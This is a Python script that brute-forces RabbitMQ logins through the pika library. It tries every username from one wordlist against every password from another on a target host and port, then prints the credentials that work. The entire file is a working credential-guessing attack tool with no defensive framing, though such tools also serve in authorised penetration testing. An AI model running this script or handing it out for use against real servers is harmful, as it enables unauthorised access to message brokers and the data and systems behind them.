import pathlib
import pika
import sys


def check_auth(username, password, host, port):
    try:
        connection = pika.BlockingConnection(pika.ConnectionParameters(host, port, '/', pika.credentials.PlainCredentials(username, password)))
    except pika.exceptions.ProbableAuthenticationError:
        return False
    return True

def usage(script_name):
    print("Usage:  {} <usernames_file> <passwords_file> <target_host> <target_port>".format(script_name))
    exit(1)

if len(sys.argv) != 5:
    usage(sys.argv[0])

if not pathlib.Path(sys.argv[1]).exists():
    usage(sys.argv[0])
if not pathlib.Path(sys.argv[2]).exists():
    usage(sys.argv[0])

usernames_file = sys.argv[1]
passwords_file = sys.argv[2]
host = sys.argv[3]
port = sys.argv[4]

valid_logins = {}

with open(usernames_file, 'r') as uf:
    for user in uf:
        user = user.strip()
        print("Trying to brute username {} ...".format(user))
        counter = 0
        with open(passwords_file, 'r') as pf:
            for password in pf:
                password = password.strip()
                success = check_auth(user, password, host, port)
                if success:
                    valid_logins[user] = password
                    break
                counter += 1
                if counter % 1000 == 0:
                    print("Tried {} passwords so far...".format(counter))

print("Finished! Valid logins:")
print(valid_logins)
